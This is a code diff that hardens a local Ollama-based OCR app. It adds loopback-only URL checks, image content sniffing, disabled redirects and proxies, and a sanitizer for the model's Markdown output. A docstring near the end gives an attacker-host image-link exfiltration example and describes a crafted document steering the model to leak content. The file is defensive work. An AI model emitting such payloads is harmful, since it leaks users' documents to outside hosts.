@@ -7,16 +7,19 @@ headlessly and no worker can accidentally touch the GUI.
 from __future__ import annotations
 
 import io
+import ipaddress
 import os
-import shutil
+import re
 import subprocess
 import sys
 import tempfile
+from contextlib import closing
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Callable
+from typing import Callable, Iterable, Iterator
 from urllib.parse import urlparse
 
+import httpx  # the transport ollama uses; imported to validate hosts as it does
 import ollama
 import pymupdf
 
@@ -42,16 +45,64 @@ class OCRRequest:
     dpi: int
 
 
+def is_loopback_host(hostname: str | None) -> bool:
+    """True only for hosts that cannot leave this machine.
+
+    Accepts the literal name ``localhost`` (optionally fully qualified with a
+    trailing dot) and any loopback IP literal — the whole 127.0.0.0/8 range,
+    ``::1``, and IPv4-mapped forms such as ``::ffff:127.0.0.1``.
+
+    Everything else is rejected, including names that merely *look* local
+    (``localhost.example.com``, ``127.0.0.1.example.com``). Callers must pass
+    ``urlparse(...).hostname`` rather than ``.netloc`` so that userinfo tricks
+    like ``http://localhost@example.com/`` resolve to the real host.
+    """
+    if not hostname:
+        return False
+    host = hostname.strip().lower()
+    # Strip at most ONE trailing dot — the root label of a fully qualified
+    # name. Deliberately not rstrip("."), which would also fold invalid
+    # forms like "localhost.." down to "localhost"; normalization here must
+    # not be more permissive than the resolver's.
+    if host.endswith("."):
+        host = host[:-1]
+    if host == "localhost":
+        # RFC 6761 reserves "localhost" and requires it to resolve to
+        # loopback; the name is never delegated in the root zone, so the
+        # worst case for the qualified form is NXDOMAIN, not a remote host.
+        return True
+    try:
+        address = ipaddress.ip_address(host)
+    except ValueError:
+        # Any other DNS name. We deliberately do not resolve it: a name that
+        # points at loopback today can point elsewhere on the next lookup.
+        return False
+    mapped = getattr(address, "ipv4_mapped", None)
+    if mapped is not None:
+        address = mapped
+    return address.is_loopback
+
+
 def normalize_ollama_url(value: str) -> str:
     """Validate a user-entered Ollama base URL and return it normalized.
 
-    Keeps any path prefix so reverse-proxy URLs work; never appends /api
-    because the official client handles API paths itself.
+    Local OCR only ever talks to an Ollama server on this machine, so the
+    host must be loopback. This is what makes the privacy claim enforceable
+    rather than merely documented: no configuration can point the app at a
+    server that would receive page images over the network.
+
+    Keeps any path prefix so local reverse-proxy URLs work; never appends
+    /api because the official client handles API paths itself.
     """
     url = value.strip().rstrip("/")
     if not url:
         raise ValueError("Ollama server URL is empty.")
-    parsed = urlparse(url)
+    try:
+        parsed = urlparse(url)
+    except ValueError as exc:
+        raise ValueError(
+            f"Ollama server URL could not be parsed: {value.strip()!r} ({exc})."
+        ) from exc
     if parsed.scheme not in ("http", "https"):
         raise ValueError(
             "Ollama server URL must start with http:// or https:// "
@@ -59,7 +110,107 @@ def normalize_ollama_url(value: str) -> str:
         )
     if not parsed.netloc:
         raise ValueError(f"Ollama server URL has no host: {value.strip()!r}.")
+
+    # Check the host as BOTH parsers see it. A URL only ever reaches the
+    # network through httpx (via ollama), so httpx's opinion is the one that
+    # decides where bytes actually go; urlparse is what a reader of this code
+    # would reason about. Requiring them to agree removes the parser
+    # -differential class of bypass entirely — a crafted URL that one parser
+    # reads as loopback and the other as a remote host is rejected outright
+    # rather than silently resolving in the client's favour.
+    try:
+        client_host = httpx.URL(url).host
+    except Exception as exc:
+        raise ValueError(
+            f"Ollama server URL could not be parsed: {value.strip()!r} ({exc})."
+        ) from exc
+
+    for hostname in (parsed.hostname, client_host):
+        if not is_loopback_host(hostname):
+            raise ValueError(
+                "Local OCR only connects to an Ollama server running on this "
+                f"machine, and {hostname!r} is not a local address.\n\n"
+                "Use http://localhost:11434, or another 127.0.0.1 / [::1] "
+                "address if your Ollama listens on a different port."
+            )
     return url
+
+
+# Magic-byte signatures for the formats we accept. Checked before Pillow is
+# handed anything, so a disguised file is rejected without its real decoder
+# ever being selected — the extension allowlist alone cannot do this,
+# because Pillow chooses a decoder by content and ignores the filename.
+_IMAGE_SIGNATURES: tuple[tuple[bytes, str], ...] = (
+    (b"\x89PNG\r\n\x1a\n", "PNG"),
+    (b"\xff\xd8\xff", "JPEG"),
+)
+
+
+def sniff_image_format(data: bytes) -> str | None:
+    """Identify an image by its leading bytes, or None if unrecognized.
+
+    Deliberately knows only the handful of formats this app accepts. Anything
+    else — PSD, GD, FITS, JPEG2000, TGA — is simply not identified, and the
+    caller rejects it.
+    """
+    for signature, name in _IMAGE_SIGNATURES:
+        if data.startswith(signature):
+            return name
+    # WebP is a RIFF container: "RIFF" <4-byte size> "WEBP".
+    if len(data) >= 12 and data[:4] == b"RIFF" and data[8:12] == b"WEBP":
+        return "WEBP"
+    return None
+
+
+def verify_image_bytes(data: bytes, origin: str) -> str:
+    """Confirm data really is an allowed image; return its format name.
+
+    Two independent checks that must agree, the same belt-and-braces shape
+    used for the Ollama URL:
+
+    1. Our own magic-byte sniff, which runs before Pillow sees the data at
+       all and so keeps a disguised file away from its decoder entirely.
+    2. Pillow's own identification plus a pixel-count ceiling, which catches
+       anything our sniff would wave through and stops a decompression bomb.
+
+    Raising here rather than returning a flag keeps the failure loud: an
+    input this app cannot vouch for is never sent to the model.
+    """
+    from PIL import Image
+
+    sniffed = sniff_image_format(data)
+    if sniffed is None or sniffed not in config.ALLOWED_IMAGE_FORMATS:
+        allowed = ", ".join(sorted(config.ALLOWED_IMAGE_FORMATS))
+        raise ValueError(
+            f"{origin} is not a supported image. Its contents do not match "
+            f"any of: {allowed}. (The file extension is not enough — the "
+            f"file's actual format is what gets decoded.)"
+        )
+    try:
+        with Image.open(io.BytesIO(data)) as img:
+            decoded = img.format
+            width, height = img.size
+    except Exception as exc:
+        raise ValueError(f"{origin} could not be read as an image: {exc}") from exc
+
+    if decoded not in config.ALLOWED_IMAGE_FORMATS:
+        raise ValueError(
+            f"{origin} claims to be {sniffed} but decodes as {decoded}; "
+            "refusing to process it."
+        )
+    if decoded != sniffed:
+        raise ValueError(
+            f"{origin} is ambiguous: it looks like {sniffed} but Pillow reads "
+            f"it as {decoded}. Refusing to process it."
+        )
+    pixels = width * height
+    if pixels > config.MAX_IMAGE_PIXELS:
+        raise ValueError(
+            f"{origin} is {width}x{height} ({pixels / 1_000_000:.0f} "
+            f"megapixels), above the {config.MAX_IMAGE_PIXELS / 1_000_000:.0f} "
+            "megapixel limit."
+        )
+    return decoded
 
 
 def validate_input_path(path: Path) -> None:
@@ -76,16 +227,135 @@ def validate_input_path(path: Path) -> None:
     if not os.access(path, os.R_OK):
         raise ValueError(f"File is not readable: {path}")
 
+    # Content check, not just the extension. Reading 12 bytes is instant even
+    # for a huge file, so this can run on the UI thread and reject a
+    # mislabelled file the moment it is picked rather than mid-job.
+    if path.suffix.lower() in config.IMAGE_EXTENSIONS:
+        try:
+            with path.open("rb") as handle:
+                header = handle.read(12)
+        except OSError as exc:
+            raise ValueError(f"File could not be read: {exc}") from exc
+        sniffed = sniff_image_format(header)
+        if sniffed is None or sniffed not in config.ALLOWED_IMAGE_FORMATS:
+            raise ValueError(
+                f"{path.name} has a {path.suffix} extension but its contents "
+                "are not a PNG, JPEG or WebP image. Refusing to process it."
+            )
+    elif path.suffix.lower() in config.PDF_EXTENSIONS:
+        try:
+            with path.open("rb") as handle:
+                header = handle.read(5)
+        except OSError as exc:
+            raise ValueError(f"File could not be read: {exc}") from exc
+        if header != b"%PDF-":
+            raise ValueError(
+                f"{path.name} has a .pdf extension but does not start with a "
+                "PDF header. Refusing to process it."
+            )
+
 
 def build_output_path(input_path: Path) -> Path:
     """Return /dir/document_extracted.md for /dir/document.<ext>."""
     return input_path.with_name(f"{input_path.stem}_extracted.md")
 
 
+def make_client(url: str, timeout: int) -> "ollama.Client":
+    """Build an Ollama client whose traffic cannot leave this machine.
+
+    Validating the URL as loopback is necessary but not sufficient — two
+    httpx defaults would otherwise carry the page image off-box anyway, and
+    both are disabled here:
+
+    ``follow_redirects`` (defaults to True)
+        Whatever is listening on the port could answer a 3xx pointing at an
+        external host, and httpx would re-send the request — page image
+        included — to that host. Verified: without this, a 307 from a local
+        listener leaks the full base64 PNG to the redirect target. Ollama
+        itself never redirects, so turning this off costs nothing.
+
+    ``trust_env`` (defaults to True)
+        This is the one that matters most, because it needs no attacker at
+        all. With ``trust_env`` on, httpx routes through whatever proxy the
+        environment names, and its proxy logic has *no loopback exemption*:
+        with ``HTTP_PROXY`` set, even ``http://localhost:11434`` is sent to
+        that proxy. Worse on the app's main platforms — httpx reads system
+        proxy configuration via ``urllib.request.getproxies()``, which on
+        macOS and Windows does not supply the OS's "bypass for localhost"
+        list, so a system-wide proxy (corporate MITM, a debugging proxy, some
+        VPN clients) would capture every page image with no env var set.
+
+    Note that ``mounts={}`` does NOT substitute for ``trust_env=False``:
+    httpx repopulates mounts from the environment.
+
+    The URL is re-validated here rather than trusted from the caller so the
+    loopback guarantee is a property of this function, not of every call
+    site remembering to validate first.
+    """
+    normalize_ollama_url(url)
+    return ollama.Client(
+        host=url,
+        timeout=timeout,
+        follow_redirects=False,
+        trust_env=False,
+    )
+
+
+def verify_ollama_endpoint(client: "ollama.Client") -> str:
+    """Confirm something Ollama-shaped is listening before sending documents.
+
+    The loopback lock guarantees page images stay on this machine. It says
+    nothing about *which* program on this machine receives them: any local
+    process that binds port 11434 first gets handed every page of every
+    document, silently, because the app would simply stream to whatever
+    answers.
+
+    Probing ``/api/version`` does not authenticate anything — there is no
+    secret to check, and a determined impersonator can return whatever this
+    function looks for. What it does buy is that the common cases fail loudly
+    instead of quietly: a wrong port, some other dev server on 11434, or a
+    process that squats the port without bothering to imitate the API. That
+    is worth one cheap request before the first page goes out.
+
+    Returns the reported version string.
+    """
+    try:
+        # The ollama client exposes no version endpoint, so this goes through
+        # its underlying httpx client — which is the transport we want, since
+        # it already carries the loopback base URL, redirects disabled and
+        # trust_env disabled.
+        response = client._client.get(
+            "/api/version", timeout=config.ENDPOINT_VERIFY_TIMEOUT
+        )
+    except Exception as exc:
+        raise OCRServiceError(
+            f"No response from the Ollama server: {exc}\n\n"
+            "Start Ollama (`ollama serve` or the desktop app) and check the "
+            "port."
+        ) from exc
+
+    if response.status_code != 200:
+        raise OCRServiceError(
+            f"The server answered /api/version with HTTP "
+            f"{response.status_code}, which is not what Ollama does. "
+            "Something else may be listening on that port."
+        )
+    try:
+        version = response.json().get("version")
+    except Exception:
+        version = None
+    if not version or not isinstance(version, str):
+        raise OCRServiceError(
+            "The server on that port did not identify itself as Ollama. "
+            "Refusing to send document pages to it."
+        )
+    return version
+
+
 def list_models(url: str) -> list[str]:
     """Fetch model tags from an Ollama server, deduplicated and sorted."""
     try:
-        client = ollama.Client(host=url, timeout=config.MODEL_LIST_TIMEOUT)
+        client = make_client(url, config.MODEL_LIST_TIMEOUT)
         response = client.list()
         tags = {
             (getattr(item, "model", None) or "").strip()
@@ -97,14 +367,81 @@ def list_models(url: str) -> list[str]:
     return sorted(tags, key=str.lower)
 
 
-def render_pdf(
+def _check_page_area(page, page_number: int, page_count: int, dpi: int) -> None:
+    """Refuse to rasterize a page that would be absurdly large.
+
+    PDF permits pages up to 200x200 inches. At 300 DPI that is 60000x60000 —
+    3.6 billion pixels, ~10 GB of RGB — and the file describing it can be a
+    few hundred bytes. MuPDF has its own ~1 GB ceiling and raises rather than
+    dying, but by then the memory has already been reached for. Measuring
+    page.rect first means the allocation is never attempted, and the message
+    can suggest the fix (a lower DPI) instead of reporting an opaque failure.
+    """
+    rect = page.rect
+    scale = dpi / 72.0  # PDF user units are 1/72 inch
+    pixels = (rect.width * scale) * (rect.height * scale)
+    if pixels > config.MAX_PAGE_PIXELS:
+        inches_w = rect.width / 72.0
+        inches_h = rect.height / 72.0
+        suggested = max(
+            (option for option in config.DPI_OPTIONS
+             if (rect.width * option / 72.0) * (rect.height * option / 72.0)
+             <= config.MAX_PAGE_PIXELS),
+            default=None,
+        )
+        hint = (
+            f" Try {suggested} DPI." if suggested
+            else " This page is too large to rasterize at any offered DPI."
+        )
+        raise OCRServiceError(
+            f"Page {page_number}/{page_count} is {inches_w:.0f}x{inches_h:.0f} "
+            f"inches, which at {dpi} DPI would be "
+            f"{pixels / 1_000_000:.0f} megapixels — above the "
+            f"{config.MAX_PAGE_PIXELS / 1_000_000:.0f} megapixel limit.{hint}"
+        )
+
+
+@dataclass(frozen=True)
+class PageImage:
+    """One page of the input, held only in memory.
+
+    ``data`` is the encoded image itself — PNG for a rendered PDF page, or
+    the original file's bytes for an image input. It is never written to
+    disk by this application.
+    """
+
+    number: int
+    total: int
+    data: bytes
+
+
+def iter_pdf_pages(
     pdf_path: Path,
     dpi: int,
-    temp_dir: Path,
     log_callback: LogCallback,
-    progress_callback: ProgressCallback | None = None,
-) -> list[Path]:
-    """Render every PDF page to a PNG in temp_dir, in original page order."""
+) -> Iterator[PageImage]:
+    """Yield each PDF page as PNG bytes, lazily, in original page order.
+
+    Two deliberate properties, both privacy-motivated:
+
+    *Never touches disk.* ``Pixmap.tobytes("png")`` produces the same bytes
+    ``Pixmap.save()`` would have written, so nothing is gained by writing a
+    file and something important is lost: a temp directory removed in a
+    ``finally`` is not removed when the process dies on SIGKILL — a crash,
+    a force-quit, an OOM kill, a flat battery — which left readable page
+    images of the document in the system temp directory indefinitely (on
+    macOS, under ``/var/folders``, which survives reboot). There is now no
+    such directory to leak.
+
+    *Lazy.* Pages are rendered one at a time as the consumer asks for them,
+    rather than all up front. Peak memory is a single page regardless of
+    document length, so a thousand-page PDF costs no more than a one-page
+    one. Rendering everything up front would merely have moved the old
+    unbounded-disk-growth problem into RAM.
+
+    The caller must close this generator (iterate it to exhaustion, or wrap
+    it in ``contextlib.closing``) so the underlying document is released.
+    """
     try:
         document = pymupdf.open(pdf_path)
     except Exception as exc:
@@ -117,37 +454,70 @@ def render_pdf(
         page_count = document.page_count
         if page_count == 0:
             raise OCRServiceError("PDF contains no pages.")
-        image_paths: list[Path] = []
+        if page_count > config.MAX_PDF_PAGES:
+            raise OCRServiceError(
+                f"PDF has {page_count} pages, above the "
+                f"{config.MAX_PDF_PAGES}-page limit. Split it into smaller "
+                "documents and run them separately."
+            )
         for index in range(page_count):
             page_number = index + 1
-            if progress_callback is not None:
-                progress_callback("render", page_number, page_count)
             log_callback(f"Rendering page {page_number}/{page_count}...")
             try:
                 page = document.load_page(index)
+                _check_page_area(page, page_number, page_count, dpi)
                 pixmap = page.get_pixmap(
                     dpi=dpi, colorspace=pymupdf.csRGB, alpha=False
                 )
-                image_path = temp_dir / f"page_{page_number:04d}.png"
-                pixmap.save(str(image_path))
+                png = pixmap.tobytes("png")
+            except OCRServiceError:
+                raise  # already precise; don't rewrap as a render failure
             except Exception as exc:
                 raise OCRServiceError(
                     f"Failed to render page {page_number}/{page_count}: {exc}"
                 ) from exc
-            image_paths.append(image_path)
-    return image_paths
+            # Drop our reference before yielding so the pixmap (the large
+            # object — a 300 DPI A4 page is ~26 MB raw) is collectable while
+            # the consumer works on the much smaller encoded PNG.
+            del pixmap
+            yield PageImage(number=page_number, total=page_count, data=png)
 
 
-def make_thumbnail_png(image_path: Path, max_side: int) -> bytes:
-    """Return a downscaled PNG of an image file, longest side <= max_side.
+def read_input_image(image_path: Path) -> Iterator[PageImage]:
+    """Yield a single-page sequence for a non-PDF input.
 
-    Tk-free (PIL only) so it can be unit-tested headlessly. Accepts any
-    format PIL can read — the input images (PNG/JPEG/WebP) and the PNGs
-    rendered from PDF pages. Smaller images are never upscaled.
+    The file is the user's own and already on their disk, so reading it into
+    memory creates no new residue; it just lets image and PDF inputs share
+    one pipeline. Reading once also replaces two separate reads of the same
+    file (one for the preview, one by the Ollama client).
+    """
+    try:
+        data = image_path.read_bytes()
+    except Exception as exc:
+        raise OCRServiceError(f"Could not read image: {exc}") from exc
+    if not data:
+        raise OCRServiceError(f"Image file is empty: {image_path}")
+    # Full verification now that the whole file is in hand: the header sniff
+    # in validate_input_path is a fast pre-filter, this is the gate.
+    try:
+        verify_image_bytes(data, image_path.name)
+    except ValueError as exc:
+        raise OCRServiceError(str(exc)) from exc
+    yield PageImage(number=1, total=1, data=data)
+
+
+def make_thumbnail_png(source: bytes | Path, max_side: int) -> bytes:
+    """Return a downscaled PNG, longest side <= max_side.
+
+    Accepts encoded image bytes (the normal path — a rendered PDF page or an
+    input image already in memory) or a filesystem path. Tk-free (PIL only)
+    so it can be unit-tested headlessly. Accepts any format PIL can read.
+    Smaller images are never upscaled.
     """
     from PIL import Image  # local import keeps module load light and headless
 
-    with Image.open(image_path) as img:
+    origin = io.BytesIO(source) if isinstance(source, (bytes, bytearray)) else source
+    with Image.open(origin) as img:
         thumbnail = img.convert("RGB")
         thumbnail.thumbnail((max_side, max_side))
         buffer = io.BytesIO()
@@ -158,12 +528,15 @@ def make_thumbnail_png(image_path: Path, max_side: int) -> bytes:
 def recognize_images(
     client: "ollama.Client",
     model: str,
-    image_paths: list[Path],
+    pages: Iterable[PageImage],
     log_callback: LogCallback,
     progress_callback: ProgressCallback | None = None,
     event_callback: EventCallback | None = None,
 ) -> list[str]:
-    """Send one independent chat request per image; return texts in order.
+    """Send one independent chat request per page; return texts in order.
+
+    ``pages`` is consumed lazily, so for a PDF each page is rendered only
+    when this function reaches it and is released immediately afterwards.
 
     Each page is requested with ``stream=True`` so that the recognized text
     appears in the UI as the model generates it.  Every chunk delta is
@@ -173,15 +546,15 @@ def recognize_images(
     emitted.  The non-streaming result is identical — streaming only adds
     the live deltas.
     """
-    total = len(image_paths)
     results: list[str] = []
-    for number, image_path in enumerate(image_paths, start=1):
+    for page in pages:
+        number, total = page.number, page.total
         if progress_callback is not None:
             progress_callback("ocr", number, total)
         if event_callback is not None:
             # A failed preview must never abort OCR: log it and move on.
             try:
-                png = make_thumbnail_png(image_path, config.THUMBNAIL_MAX_SIDE)
+                png = make_thumbnail_png(page.data, config.THUMBNAIL_MAX_SIDE)
             except Exception as exc:
                 log_callback(
                     f"Could not build preview for page {number}/{total}: {exc}"
@@ -201,7 +574,10 @@ def recognize_images(
                     {
                         "role": "user",
                         "content": config.USER_PROMPT,
-                        "images": [str(image_path)],
+                        # ollama.Image is required: the client's schema
+                        # rejects bare bytes. Serialises to exactly the same
+                        # base64 a file path would have produced.
+                        "images": [ollama.Image(value=page.data)],
                     },
                 ],
                 stream=True,
@@ -234,6 +610,51 @@ def recognize_images(
                 {"page": number, "total": total, "text": content},
             )
     return results
+
+
+# Markdown/HTML constructs that make a previewer fetch a remote resource on
+# open. Anything that merely *displays* a URL as text is left alone.
+# Note the `!+`: a single `!` would be wrong. Stripping one exclamation mark
+# from `!![](http://…)` leaves `![](http://…)`, which is still a live image
+# reference — the defusing has to consume the whole run.
+_REMOTE_MD_IMAGE = re.compile(
+    r"""!+(?=\[[^\]]*\]\(\s*(?:https?:)?//)""", re.IGNORECASE
+)
+_REF_MD_IMAGE = re.compile(r"""!+(?=\[[^\]]*\]\[)""")
+_AUTOLOADING_TAG = re.compile(
+    r"<(?=/?\s*(?:img|image|iframe|embed|object|video|audio|source|track|"
+    r"script|link|style|base|input|portal|frame|frameset)\b)",
+    re.IGNORECASE,
+)
+
+
+def neutralize_remote_media(content: str) -> tuple[str, int]:
+    """Defuse anything in model output that would fetch a URL on preview.
+
+    The recognized text is whatever the model produced from the page, and a
+    crafted document can steer that. ``![](http://attacker/leak?…)`` in the
+    saved Markdown turns "open the result" into a callback that confirms the
+    document was processed and can carry a slice of it in the query string.
+    The output file is also the one artifact of this app that gets opened by
+    another program, so it is the natural place for that to pay off.
+
+    The edit is deliberately the smallest one that works:
+
+    * ``![alt](http://…)`` becomes ``[alt](http://…)`` — an ordinary link.
+      The URL stays fully visible and clickable; it just no longer loads by
+      itself. Reference-style ``![alt][id]`` is treated the same way.
+    * ``<img …>``, ``<iframe>``, ``<script>`` and friends have their opening
+      ``<`` escaped, so a previewer renders them as visible text instead of
+      acting on them.
+
+    Local and ``data:`` image references are untouched, and no other text is
+    altered. Returns the cleaned content and the number of edits made, so the
+    caller can tell the user something was changed.
+    """
+    cleaned, image_count = _REMOTE_MD_IMAGE.subn("", content)
+    cleaned, ref_count = _REF_MD_IMAGE.subn("", cleaned)
+    cleaned, tag_count = _AUTOLOADING_TAG.subn("&lt;", cleaned)
+    return cleaned, image_count + ref_count + tag_count
 
 
 def save_markdown_atomic(output_path: Path, content: str) -> None:
@@ -302,11 +723,17 @@ def reveal_in_file_manager(path: Path) -> None:
 def process_ocr(request: OCRRequest, event_queue) -> Path:
     """Run the full OCR pipeline; emit ('log', message) events; return output.
 
-    Raises on any failure. The temporary render directory is always removed
-    in the one outer finally, on success and on every failure path. The
-    caller (worker wrapper) enqueues the single terminal success/error event
-    after this function has returned or raised, so cleanup always precedes
-    the terminal event.
+    Raises on any failure.
+
+    No page image is ever written to disk: PDF pages are rendered to PNG
+    bytes on demand and released as soon as they have been recognized. There
+    is therefore no temporary directory to clean up, and nothing for a crash
+    to leave behind. The only file this function writes is the requested
+    Markdown output.
+
+    The generator is closed through ``contextlib.closing`` on every path,
+    including a mid-document failure, so the PDF handle is released promptly
+    rather than at the whim of the garbage collector.
     """
 
     def log(message: str) -> None:
@@ -318,49 +745,49 @@ def process_ocr(request: OCRRequest, event_queue) -> Path:
     def emit_event(kind: str, payload: dict) -> None:
         event_queue.put((kind, payload))
 
-    temp_dir: Path | None = None
-    try:
-        if request.input_path.suffix.lower() in config.PDF_EXTENSIONS:
-            log("[1/3] Preparing document...")
-            try:
-                temp_dir = Path(tempfile.mkdtemp(prefix="local_ocr_"))
-            except Exception as exc:
-                raise OCRServiceError(
-                    f"Could not create temporary render directory: {exc}"
-                ) from exc
-            image_paths = render_pdf(
-                request.input_path,
-                request.dpi,
-                temp_dir,
-                lambda message: log(f"[1/3] {message}"),
-                progress,
-            )
-        else:
-            log("[1/3] Preparing image...")
-            image_paths = [request.input_path]
+    if request.input_path.suffix.lower() in config.PDF_EXTENSIONS:
+        log("[1/3] Preparing document...")
+        pages = iter_pdf_pages(
+            request.input_path,
+            request.dpi,
+            lambda message: log(f"[1/3] {message}"),
+        )
+    else:
+        log("[1/3] Preparing image...")
+        pages = read_input_image(request.input_path)
 
+    with closing(pages):
         try:
-            client = ollama.Client(
-                host=request.ollama_url,
-                timeout=config.OCR_STREAM_IDLE_TIMEOUT,
+            client = make_client(
+                request.ollama_url, config.OCR_STREAM_IDLE_TIMEOUT
             )
         except Exception as exc:
             raise OCRServiceError(
                 f"Could not create Ollama client for {request.ollama_url}: {exc}"
             ) from exc
 
+        # Confirm Ollama is what is actually listening before handing it a
+        # single page. A local process squatting the port would otherwise
+        # collect the whole document in silence.
+        version = verify_ollama_endpoint(client)
+        log(f"[1/3] Ollama {version} responding at {request.ollama_url}")
+
         page_texts = recognize_images(
             client,
             request.model,
-            image_paths,
+            pages,
             lambda message: log(f"[2/3] {message}"),
             progress,
             emit_event,
         )
 
-        log("[3/3] Saving Markdown...")
-        save_markdown_atomic(request.output_path, "\n\n".join(page_texts))
-        return request.output_path
-    finally:
-        if temp_dir is not None:
-            shutil.rmtree(temp_dir, ignore_errors=True)
+    log("[3/3] Saving Markdown...")
+    content, neutralized = neutralize_remote_media("\n\n".join(page_texts))
+    if neutralized:
+        log(
+            f"[3/3] Note: defused {neutralized} remote media reference(s) in "
+            "the recognized text so opening the result cannot fetch them. "
+            "The URLs are still readable in the file."
+        )
+    save_markdown_atomic(request.output_path, content)
+    return request.output_path
